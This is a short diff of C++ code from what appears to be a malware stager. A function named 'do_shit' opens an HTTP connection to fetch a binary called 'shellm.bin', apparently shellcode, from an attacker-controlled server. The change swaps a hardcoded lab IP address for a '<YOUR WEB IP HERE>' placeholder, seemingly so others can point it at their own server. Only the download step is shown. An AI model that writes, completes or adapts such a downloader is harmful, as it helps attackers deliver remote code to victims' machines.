@@ -31,7 +31,7 @@ void do_shit() {
     }
 
     // Open HTTP connection
-    HINTERNET hUrl = InternetOpenUrl(hInternet, L"http://192.168.120.128/shellm.bin", nullptr, 0, INTERNET_FLAG_RELOAD, 0);
+    HINTERNET hUrl = InternetOpenUrl(hInternet, L"http://<YOUR WEB IP HERE>/shellm.bin", nullptr, 0, INTERNET_FLAG_RELOAD, 0);
     if (hUrl == nullptr) {
         
         InternetCloseHandle(hInternet);
